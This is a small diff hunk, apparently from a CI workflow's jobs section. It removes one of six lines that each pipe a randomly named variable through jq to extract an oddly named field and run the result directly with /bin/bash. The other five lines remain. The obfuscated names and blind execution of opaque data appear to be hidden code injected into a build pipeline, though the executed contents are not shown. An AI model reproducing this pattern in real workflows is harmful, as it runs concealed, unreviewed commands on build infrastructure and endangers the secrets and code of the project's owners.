@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$eozct91" | jq -r .xe539 | /bin/bash
           printf '%s' "$oqlyk401" | jq -r .d309 | /bin/bash
           echo $y19197 | jq -r .jpli03 | /bin/bash
-          printf '%s' "$bn83" | jq -r .z34 | /bin/bash
           echo $jzrnk77857 | jq -r .j70 | /bin/bash
 
       - name: Archive output
